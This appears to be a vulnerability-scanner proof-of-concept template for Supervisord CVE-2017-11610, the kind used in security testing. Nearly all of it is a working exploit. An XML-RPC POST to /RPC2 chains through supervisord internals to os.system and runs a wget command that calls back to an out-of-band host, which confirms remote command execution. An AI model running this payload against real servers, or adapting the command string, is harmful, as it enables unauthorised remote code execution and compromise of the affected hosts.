name: poc-yaml-supervisord-cve-2017-11610
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /RPC2
    body: >-
      <?xml version="1.0"?>
            <methodCall>
            <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
            <params>
            <param>
            <string>wget {{reverseURL}}</string>
            </param>
            </params>
            </methodCall>
    follow_redirects: false
    expression: |
      response.status == 200 && reverse.wait(5)
detail:
  author: Loneyer
  links:
    - https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610
